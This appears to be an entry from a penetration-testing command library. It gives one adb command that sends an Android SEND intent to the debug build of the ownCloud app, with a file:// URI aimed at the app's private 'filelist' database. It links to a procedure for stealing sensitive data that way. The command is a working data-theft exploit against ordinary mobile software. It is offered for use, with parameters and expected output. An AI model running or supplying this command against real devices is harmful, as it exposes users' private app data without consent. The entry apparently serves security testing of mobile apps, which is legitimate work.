---
data: >-
  adb shell am start -n
  com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity
  -t "text/plain" --grant-read-uri-permission -a "android.intent.action.SEND"
  --eu "android.intent.extra.STREAM"
  "file:///data/data/com.owncloud.android/databases/filelist"
tags:
  - adb
  - android
  - debug
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:45.259Z'
id: 457be1e8-6538-45cd-bdca-59a0d04b7a6b
verified: false
validated: true
submitted: true
---
# ADB Send Intent to Filelist Debug

## Command

```bash
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" --grant-read-uri-permission -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/data/com.owncloud.android/databases/filelist"
```

## Description

Variant of the ADB command using the debug package name to target the filelist database in a debug build of the ownCloud app.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Debug component | Yes |
| -t "text/plain" | MIME type | Yes |
| --grant-read-uri-permission | Grant | Yes |
| -a "android.intent.action.SEND" | Action | Yes |
| --eu "android.intent.extra.STREAM" | File URI | Yes |

## Examples

### Basic Usage

```bash
# As above
```

## Expected Output

Activity starts in debug mode and processes the file successfully.

## Related

- [[Related Procedure: Send Intent to Steal Sensitive Data]]
